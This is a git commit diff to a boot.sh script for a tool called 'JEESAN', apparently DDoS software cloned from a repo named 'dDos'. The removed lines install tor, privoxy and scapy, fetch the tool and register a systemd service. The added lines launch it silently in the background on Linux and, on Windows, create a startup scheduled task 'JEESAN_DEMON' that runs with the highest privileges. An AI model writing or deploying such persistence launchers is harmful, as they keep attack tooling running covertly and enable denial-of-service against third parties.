29254a5cba4544aec1fdb34672f4ccdc484bc9bb
Jeesan Tolentinu <jesun2221@gmail.com>
2026-08-19 10:24:51 +0600

    Update boot.sh

--- boot.sh
+++ boot.sh
@@ -1,18 +1,11 @@
-echo "[☠] Initializing JEESAN v6.66..."
-apt update
-apt install -y python3 python3-pip tor privoxy git curl net-tools procps
-pip3 install scapy requests h2 stem colorama dnspython psutil
-
-systemctl enable tor && systemctl start tor
-systemctl enable privoxy && systemctl start privoxy
-
-cd /tmp || exit
-git clone https://github.com/JEESAN2225/dDos.git
-cd dDos
-cp jeesan.py /opt/jeesan-core.py
-cp jeesan.service /etc/systemd/system/
-systemctl daemon-reexec
-systemctl enable jeesan.service
-systemctl start jeesan.service
-
-echo "[🔥] JEESAN IS NOW LIVE. RUN: sudo python3 /opt/jeesan-core.py"
+#!/bin/bash
+OS=$(uname -s)
+if [[ "$OS" == "Linux" ]]; then
+    sudo systemctl enable jeesan.service 2>/dev/null
+    sudo systemctl start jeesan.service 2>/dev/null &
+    nohup python3 /opt/jeesan.py > /dev/null 2>&1 &
+elif [[ "$OS" == MINGW* || "$OS" == MSYS* ]]; then
+    schtasks //create //tn "JEESAN_DEMON" //tr "pythonw C:\Users\Public\jeesan.py" //sc onstart //rl HIGHEST //f
+    start "" pythonw C:\Users\Public\jeesan.py
+fi
+exit 0
